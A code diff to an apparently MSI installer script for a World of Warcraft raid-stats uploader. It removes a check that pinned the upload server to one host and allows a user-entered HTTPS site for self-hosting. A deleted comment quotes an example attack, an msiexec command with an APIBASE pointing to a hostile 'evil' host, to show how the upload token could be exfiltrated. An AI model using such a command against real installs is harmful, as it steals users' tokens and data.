@@ -52,20 +52,19 @@ function verifyInputs() {
         "That folder is not a World of Warcraft install (no _retail_ folder inside it).";
       return;
     }
-    if (api.toLowerCase().substr(0, 8) !== "https://") {
-      Session.Property("RTS_ERR") = "Server URL must be https://.";
-      return;
-    }
-    // Lock the destination to the canonical host. Without this, an
-    // attacker-supplied APIBASE= public property (e.g.
-    // msiexec /i rts.msi APIBASE=https://evil) would exfiltrate the
-    // upload token + WoW data to a hostile server.
-    var apiHost = api.toLowerCase().substr(8).split("/")[0].split(":")[0];
-    if (apiHost !== "raiders.hxxp.io") {
+    if (!api) {
       Session.Property("RTS_ERR") =
-        "Server URL must be https://raiders.hxxp.io.";
+        "Enter your Raid Stats site address (e.g. https://raid.example.com).";
       return;
     }
+    if (api.toLowerCase().substr(0, 8) !== "https://") {
+      Session.Property("RTS_ERR") = "Site address must start with https:// .";
+      return;
+    }
+    // Self-hostable: the destination is the user-entered site, NOT pinned to
+    // one host. Safety: the URL is typed + confirmed in the GUI and must be
+    // HTTPS, and the token is verified against THIS host (below) before any
+    // data is sent. (Silent installs must pass a trusted APIBASE.)
 
     var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
     http.SetTimeouts(5000, 8000, 8000, 15000);
